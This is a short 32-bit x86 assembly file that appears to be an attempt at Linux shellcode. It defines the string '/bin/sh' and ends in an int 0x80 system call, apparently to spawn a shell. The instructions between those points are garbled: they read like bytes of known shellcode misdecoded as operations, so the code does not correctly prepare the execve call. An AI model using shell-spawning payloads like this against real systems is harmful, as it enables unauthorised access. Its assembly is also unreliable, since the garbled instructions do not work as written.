BITS 32
section .data
	
	shellpathhandle db 0
	shellpath: db "/bin/sh",0
	shellpathlen: equ $-shellpath

section .text
	global _start

_start:

	lea esi, [shellpathhandle]
	jmp stuff

stuff:	
	add eax, 0xc683c031

	add [ecx+0x46890876], ecx
	or al, 0xb0
	or ecx, [ebp+0x84e8d1e] 

	lea edx, [esi+12]
	int 0x80